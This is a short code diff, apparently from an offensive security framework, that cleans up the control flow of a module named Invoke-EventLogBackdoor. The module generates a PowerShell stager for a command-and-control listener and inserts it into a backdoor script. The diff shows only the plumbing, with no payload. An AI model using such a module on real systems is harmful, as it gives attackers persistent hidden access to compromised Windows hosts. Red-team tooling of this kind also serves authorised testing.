@@ -57,18 +57,16 @@ Invoke-EventLogBackdoor"""
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
 
-        else:
-            stager_code = main_menu.stagers.generate_launcher(
-                listenerName=listener_name,
-                language="powershell",
-                obfuscate=False,
-                encode=False,
-            )
+        stager_code = main_menu.stagers.generate_launcher(
+            listenerName=listener_name,
+            language="powershell",
+            obfuscate=False,
+            encode=False,
+        )
 
-            if stager_code == "":
-                return handle_error_message("[!] Error in launcher generation.")
-            else:
-                script = script.replace("REPLACE_LAUNCHER", stager_code)
+        if stager_code == "":
+            return handle_error_message("[!] Error in launcher generation.")
+        script = script.replace("REPLACE_LAUNCHER", stager_code)
 
         for option, values in params.items():
             if (
@@ -114,10 +112,9 @@ Invoke-EventLogBackdoor"""
             parts[0], " ".join(parts[1:])
         )
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end="",
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
